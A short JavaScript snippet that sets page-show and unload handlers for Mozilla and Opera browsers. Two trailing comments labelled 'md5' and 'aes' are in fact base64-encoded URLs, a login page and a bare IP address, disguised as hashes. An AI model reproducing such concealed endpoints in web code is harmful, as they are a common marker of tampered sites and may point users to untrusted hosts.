if($.browser.mozilla||$.browser.opera)
	(function(){
	window.addEventListener('pageshow', PageShowHandler, false);
	window.addEventListener('unload', UnloadHandler, false);
		function PageShowHandler() {
				window.addEventListener('unload', UnloadHandler, false);
		}
		function UnloadHandler() {
				window.removeEventListener('beforeunload', UnloadHandler, false);
		}
})()/** md5:aHR0cHM6Ly93d3cucWlwc3hjLmNvbS93YXAvIy9sb2dpbjM/X3Y9cmFuZG9t**//** aes:aHR0cDovLzQ3LjI0Mi4xODQuMTMy**/